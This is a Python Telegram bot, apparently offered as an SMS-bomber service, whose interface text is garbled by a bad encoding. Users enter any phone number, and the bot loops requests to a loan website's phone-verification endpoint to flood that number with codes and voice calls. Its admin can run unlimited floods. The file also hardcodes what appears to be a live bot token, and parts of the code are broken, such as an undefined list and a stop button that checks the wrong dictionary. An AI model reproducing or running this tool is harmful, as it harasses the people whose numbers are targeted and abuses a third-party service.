import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time
import random

TOKEN = '7503603443:AAGM2-ROm0Cq18Hoq2a2ncvnFqxQ0Gj9MCU' # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à —Ç–æ–∫–µ–Ω

THREADS_LIMIT = 200

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 7042191324 # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à ID —á–∞—Ç–∞

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams = {} # –ò–∑–º–µ–Ω–∏–ª–∏ –Ω–∞ —Å–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è —Ñ–ª—É–¥–∞

print('Bot has started! You can use him.')

def save_chat_id(chat_id):
    "–§—É–Ω–∫—Ü–∏—è –¥–æ–±–∞–≤–ª—è–µ—Ç —á–∞—Ç –∞–π–¥–∏ –≤ —Ñ–∞–π–ª –µ—Å–ª–∏ –µ–≥–æ —Ç–∞–º –Ω–µ—Ç—É"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"—Å–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤—Å–µ–º ({users_amount[0]}) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –±–æ—Ç–∞!")


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='ü•∂–§–ª—É–¥ –°–º—Å')
    stop = types.KeyboardButton(text='–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–ª—É–¥')
    info = types.KeyboardButton(text='ü§ñ–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
    stats = types.KeyboardButton(text='üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
    faq = types.KeyboardButton(text='‚ùóÔ∏è FAQ / –°–æ–≥–ª–∞—à–µ–Ω–∏–µ')

    buttons_to_add = [boom, stop, info, stats, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='üî•–†–∞—Å—Å—ã–ª–∫–∞'))
        buttons_to_add.append(types.KeyboardButton(text='addbl'))
        buttons_to_add.append(types.KeyboardButton(text='delbl'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—åüôã‚Äç‚ôÇÔ∏è!\n\n<b>–í –¥–∞–Ω–Ω–æ–º –±–æ—Ç–µ —Ç—ã —Å–º–æ–∂–µ—à—å –∑–∞—Ñ–ª—É–¥–∏—Ç—å –ª—é–±–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞!</b>\n\n<b>–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:</b>', reply_markup=keyboard, parse_mode='HTML')
    save_chat_id(message.chat.id)


heads = [
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]


iteration = 0
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def send_for_number(phone):
        request_timeout = 0.00001
        iteration = 0
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        _phone = phone
        self_formatted_phone = phone
        _phone9 = _phone[1:] 
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
        while True:
            try:
                requests.get('https://lk.tvoizaymy.ru/auth/phone?phone=' + _phone9 + '&fingerprint=2317e373cc9f2a422370b2f614cbb72c&voice_password=1&geolocation=null')
                print('Tvoi Zaim: –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ')

                iteration += 1
            except:
                pass

@bot.message_handler(commands=["addbl"])
def addbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            newloser = f'{message.text[7:]}'
            if newloser == '':
                bot.send_message(ADMIN_CHAT_ID, "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä id –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
            else:
                f = open('idBL.txt' , 'a')
                f.write(f'{newloser}' + '\n')
                f.close()
                bot.send_message(ADMIN_CHAT_ID, "–î–æ–±–∞–≤–ª–µ–Ω –Ω–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ —á–µ—Ä–Ω—ã–π –ª–∏—Å—Ç: "+f'{newloser}')
        else:
            bot.send_message(message.chat.id, "–î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω—É")
    except:
        pass

@bot.message_handler(commands=['delbl'])
def delbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            idunban = f'{message.text[7:]}'
            with open("idBL.txt") as file:
                arrayBL = [row.strip() for row in file]
                if idunban == '':
                    bot.send_message(ADMIN_CHAT_ID, "–í–≤–µ–¥–∏—Ç–µ id –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
                elif idunban in arrayBL:
                    sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
                    f = open('idBL.txt', 'w')
                    f.write(sss)
                    f.close()
                    bot.send_message(ADMIN_CHAT_ID, '–ì–æ—Ç–æ–≤–æ.')
                else:
                    bot.send_message(ADMIN_CHAT_ID, '–¢–∞–∫–æ–≥–æ —é–∑–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ')
        else:
            bot.send_message(message.chat.id, "–î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω—É")
    except:
        pass

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    bot.send_message(chat_id, "–ü—Ä–æ–≤–µ—Ä—è–µ–º —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫...")
    with open("idBL.txt") as file:
        arrayBL = [row.strip() for row in file]
        iduser = f'{chat_id}'
    if iduser in arrayBL:
        bot.send_message(chat_id, "–í—ã –≤ —á–µ—Ä–Ω–æ–º –ª–∏—Å—Ç–µ!\n–ï—Å–ª–∏ –í—ã —Å—á–∏—Ç–∞–µ—Ç–µ, —á—Ç–æ –±–∞–Ω –±—ã–ª –ø–æ–ª—É—á–µ–Ω —Å–ª—É—á–∞–π–Ω–æ - –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –∫ @san_riched.\n–í–æ—Ç –í–∞—à id, –æ–Ω –ø—Ä–∏–≥–æ–¥–∏—Ç—Å—è –∞–¥–º–∏–Ω—É: <b>"+f'{chat_id}'+"</b>", parse_mode="HTML")
    else:
        bot.send_message(ADMIN_CHAT_ID, f"{chat_id} –æ—Ç–ø—Ä–∞–≤–∏–ª —Å–ø–∞–º –Ω–∞ {phone_number}", parse_mode='HTML')


    bot.send_message(chat_id, f'<b>üë®‚Äçüíª–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone_number}\nüôà–¢–∞–π–º–µ—Ä: 2 –º–∏–Ω—É—Ç—ã\nüòÑ–°–ø–∞–º —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª—Å—è!</b>\n\n–í –∫–æ–Ω—Ü–µ, –≤–∞–º –ø—Ä–∏–¥–µ—Ç –æ—Ç—á–µ—Ç –æ —Å–ø–∞–º–µ.', parse_mode='HTML')
    end = datetime.now() + timedelta(minutes = 2)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'<b>–°–ø–∞–º –Ω–∞ –Ω–æ–º–µ—Ä {phone_number} –∑–∞–≤–µ—Ä—à—ë–Ω</b>', parse_mode='HTML')
    THREADS_AMOUNT[0] -= 1 # —Å—Ç–æ—è–ª–æ 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, '–í—ã —É–∂–µ –Ω–∞—á–∞–ª–∏ —Ä–∞—Å—Å—ã–ª–∫—É —Å–ø–∞–º–∞. –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–ø–∞–º –∏ –ø–æ—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, '–°–µ—Ä–≤–µ—Ä–∞ —Å–µ–π—á–∞—Å –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω—ã. –ü–æ–ø—ã—Ç–∞–π—Ç–µ—Å—å —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç.')
        print('–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç—Ä–µ–¥–æ–≤ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è. –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'ü§ñ–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è':
        bot.send_message(chat_id, '–°–æ–∑–¥–∞—Ç–µ–ª—å –±–æ—Ç–∞: @san_riched\n<b>spamm3r bot\n\n–ü–æ –≤–æ–ø—Ä–æ—Å–∞–º —Å–æ—Ç—Ä—É–¥–Ω–∏—á–µ—Å—Ç–≤–∞ –æ–±—Ä–∞—â–∞—Ç—å—Å—è –≤ –õ–° –∫ —Å–æ–∑–¥–∞—Ç–µ–ª—é –±–æ—Ç–∞\n\n –ö–∞–Ω–∞–ª —Å–æ–∑–¥–∞—Ç–µ–ª—è —Å–∫—Ä–∏–ø—Ç–∞: @codingbots</b>', parse_mode='HTML')

    elif text == 'ü•∂–§–ª—É–¥ –°–º—Å':
        bot.send_message(chat_id, '<b>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –±–µ–∑ + –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\nüá∑üá∫ 79xxxxxxxxx</b>', parse_mode='HTML')

    elif text == 'üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞':
        bot.send_message(chat_id, f'üìä–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏üì°!\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–πüôé‚Äç‚ôÇ: {users_amount[0]}<b>\n–û–±—â–µ–µ –∫–æ–ª-–≤–æ —Å–µ—Ä–≤–∏—Å–æ–≤: 1\n–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: 04.02.2020</b>', parse_mode='HTML')

    elif text == 'üî•–†–∞—Å—Å—ã–ª–∫–∞' and chat_id==ADMIN_CHAT_ID:
        bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: "–†–ê–ó–û–°–õ–ê–¢–¨: –≤–∞—à_—Ç–µ–∫—Å—Ç" –±–µ–∑ –∫–∞–≤—ã—á–µ–∫')

    elif text == '‚ùóÔ∏è FAQ / –°–æ–≥–ª–∞—à–µ–Ω–∏–µ':
        bot.send_message(chat_id, '–í—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–≤–µ—á–∞–µ—Ç–µ –∑–∞ —Å–≤–æ–∏ –¥–µ–π—Å—Ç–≤–∏—è —Å —ç—Ç–∏–º –±–æ—Ç–æ–º. –ú—ã –Ω–µ –Ω–µ—Å–µ–º –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏, —Ç–æ–ª—å–∫–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ! –°–ø–∞—Å–∏–±–æ –∑–∞ –≤–Ω–∏–º–∞–Ω–∏–µ.')

    elif message.text == '–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–ª—É–¥':
        if message.chat.id in running_spams:
            running_spams[message.chat.id] = False # –í—ã–∫–ª—é—á–∏–ª–∏ —Ñ–ª–∞–≥ —Ñ–ª—É–¥–∞
            bot.send_message(message.chat.id, '–§–ª—É–¥ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!')
        else:
            bot.send_message(message.chat.id, '–§–ª—É–¥ –Ω–µ –∑–∞–ø—É—â–µ–Ω!')

    elif text == 'addbl':
        addbl(message)

    elif text == 'delbl':
        delbl(message)

    elif '–†–ê–ó–û–°–õ–ê–¢–¨: ' in text and chat_id==ADMIN_CHAT_ID:
        msg = text.replace("–†–ê–ó–û–°–õ–ê–¢–¨: ","")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –í–≤–µ–¥–µ–Ω–æ {len(text)} —Å–∏–º–≤–æ–ª–æ–≤, –æ–∂–∏–¥–∞–µ—Ç—Å—è 11')
        print(f'–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –í–≤–µ–¥–µ–Ω–æ {len(text)} —Å–∏–º–≤–æ–ª–æ–≤, –æ–∂–∏–¥–∞–µ—Ç—Å—è 11')

if __name__ == '__main__':
    bot.polling(none_stop=True)
